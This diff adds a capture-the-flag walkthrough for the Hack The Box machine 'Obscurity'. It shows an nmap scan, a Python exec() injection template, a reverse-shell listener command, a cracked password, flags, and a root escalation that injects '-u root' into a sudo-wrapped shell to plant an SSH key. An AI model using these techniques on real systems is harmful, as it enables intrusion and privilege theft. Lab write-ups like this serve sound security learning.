@@ -1,0 +1,121 @@
+Box name: Obscurity
+OS: Linux
+Difficulty: Medium
+IP: 10.10.10.168
+
+# Nmap 7.80 scan initiated Wed Jan  1 18:32:57 2020 as: nmap -A -sV -T4 -p- -v -Pn -oN initial.nmap obscure.htb
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
+|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
+|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
+80/tcp   closed http
+8080/tcp open   http-proxy BadHTTPServer
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Wed, 01 Jan 2020 05:34:25
+|     Server: BadHTTPServer
+|     Last-Modified: Wed, 01 Jan 2020 05:34:25
+|     Content-Length: 4171
+|     Content-Type: text/html
+|     Connection: Closed
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>0bscura</title>
+|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <meta name="keywords" content="">
+|     <meta name="description" content="">
+|     <!-- 
+|     Easy Profile Template
+|     http://www.templatemo.com/tm-467-easy-profile
+|     <!-- stylesheet css -->
+|     <link rel="stylesheet" href="css/bootstrap.min.css">
+|     <link rel="stylesheet" href="css/font-awesome.min.css">
+|     <link rel="stylesheet" href="css/templatemo-blue.css">
+|     </head>
+|     <body data-spy="scroll" data-target=".navbar-collapse">
+|     <!-- preloader section -->
+|     <!--
+|     <div class="preloader">
+|_    <div class="sk-spinner sk-spinner-wordpress">
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: BadHTTPServer
+|_http-title: 0bscura
+9000/tcp closed cslistener
+# Nmap done at Wed Jan  1 18:34:41 2020 -- 1 IP address (1 host up) scanned in 104.50 seconds
+
+http://obscure.htb:8080/ is a generic page, at the bottom it shows a message to a developer about a python file: 
+SuperSecureServer.py which can be found in a development directory
+
+a few url guesses shows a /develop/SuperSecureServer.py file exists
+
+Line 139 of this file directly formats the GET path into an exec() function on document serve like the following:
+    info = "output = 'Document: {}'"
+    exec(info.format(path))
+
+The exploit script I wrote executes arbitrary python code formatted into the exec statement.
+the exploit string looks something like this:
+    "';PYTHON CODE TO RUN;nothing='"
+
+I used the python one-liner reverse shell from pentestmonkey as a payload.
+
+the script can be used like this:
+    ./exploit.sh http://obscure.htb:8080/ 10.10.14.2 2000
+                  ^         ^        ^       ^         ^
+              PROTOCOL    HOST     PORT  YOUR IP   YOUR PORT
+catching with a netcat listener:
+    ncat -lvnp 2000
+
+shell'd
+
+in the /home/robert directory there is a crypto script, sample input and output, and what seems to be an encrypted password
+
+using the decrypt function from the SuperSecureCrypt.py script, it is possible to reverse the cipher (I think it's vigenere) and reveal the key
+this is in new.py
+
+robert:SecThruObsFTW
+
+ssh robert@obscure.htb
+
+user'd
+e4493782066b55fe2755708736ada2d7
+
+sudo -l
+
+there is a python file called BetterSSH.py which robert has NOPASSWD execution on
+    sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+ 
+login as robert and there's an error
+it wants a /tmp/SSH directory but there is none.
+    mkdir /tmp/SSH
+
+run the thing again and you get a strange functioning shell.
+
+looking at the script there are these 4 lines starting at line 57:
+    command = input(session['user'] + "@Obscure$ ")
+    cmd = ['sudo', '-u',  session['user']]
+    cmd.extend(command.split(" "))
+    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+by prepending a
+	-u root
+to a command run via this shell will override the -u robert, running the command as root.
+
+place an ssh key in /dev/shm/authorized_keys (perms: 600) then running
+	-u root chown root:root /dev/shm/authorized_keys
+and then
+	-u root mv /dev/shm/authorized_keys /root/.ssh/
+
+you can login as root:
+ssh root@obscure.htb
+
+uid=0(root) gid=0(root) groups=0(root)
+
+root'd
+512fd4429f33a113a44d5acde23609e3
